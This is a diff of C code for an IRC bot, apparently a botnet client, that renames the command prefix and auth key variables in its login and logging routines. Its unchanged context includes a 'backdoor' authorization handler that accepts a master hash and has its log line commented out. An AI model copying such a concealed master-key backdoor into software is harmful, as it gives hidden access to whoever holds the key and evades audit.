@@ -214,9 +214,9 @@ static void reply(char *nick, struct chanset_t *chan, const char *format, ...)
 static void logc(const char *cmd, Auth *a, char *chname, char *par)
 {
   if (chname && chname[0])
-    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %c%s %s", a->nick, a->host, a->handle, chname, cmdprefix, cmd, par ? par : "");
+    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %s %c%s %s", a->nick, a->host, a->handle, chname, auth_prefix[0], cmd, par ? par : "");
   else
-    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %c%s %s", a->nick, a->host, a->handle, cmdprefix, cmd, par ? par : "");
+    putlog(LOG_CMDS, "*", "(%s!%s) !%s! %c%s %s", a->nick, a->host, a->handle, auth_prefix[0], cmd, par ? par : "");
 }
 #define LOGC(cmd) logc(cmd, a, chname, par)
   
@@ -253,7 +253,7 @@ AuthFinish(Auth *auth)
 {
   putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", auth->nick, auth->host, auth->handle);
   auth->Done();
-  dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %chelp\n", auth->nick, cmdprefix);
+  dprintf(DP_HELP, "NOTICE %s :You are now authorized for cmds, see %chelp\n", auth->nick, auth_prefix[0]);
 }
 
 static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
@@ -274,13 +274,13 @@ static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
 
   if (u_pass_match(u, pass) && !u_pass_match(u, "-")) {
     auth->user = u;
-    if (strlen(authkey) && get_user(&USERENTRY_SECPASS, u)) {
+    if (strlen(auth_key) && get_user(&USERENTRY_SECPASS, u)) {
       putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH", nick, host, u->handle);
       auth->Status(AUTH_HASH);
       auth->MakeHash();
       dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, auth->rand, conf.bot->nick);
     } else {
-      /* no authkey and/or no SECPASS for the user, don't require a hash auth */
+      /* no auth_key and/or no SECPASS for the user, don't require a hash auth */
       AuthFinish(auth);
     }
   } else {
@@ -293,7 +293,7 @@ static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
 
 static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
 {
-  if (strlen(authkey) && get_user(&USERENTRY_SECPASS, u)) {
+  if (strlen(auth_key) && get_user(&USERENTRY_SECPASS, u)) {
     if (match_my_nick(nick))
       return BIND_RET_BREAK;
     if (u && u->bot)
@@ -381,7 +381,7 @@ static int msg_pls_bd(char *nick, char *host, struct userrec *u, char *par)
   if (check_master_hash(auth->rand, par) || !strcmp(auth->hash, par)) { /* good hash! */
     /* putlog(LOG_CMDS, "*", "(%s!%s) !%s! +AUTH", nick, host, u->handle); */
     auth->Done(1);
-    dprintf(DP_HELP, "NOTICE %s :You are now authorized for the backdoor. See '%cbd help'\n", nick, cmdprefix);
+    dprintf(DP_HELP, "NOTICE %s :You are now authorized for the backdoor. See '%cbd help'\n", nick, auth_prefix[0]);
   } else { /* bad hash! */
     dprintf(DP_HELP, "NOTICE %s :Invalid hash.\n", nick);
     delete auth;
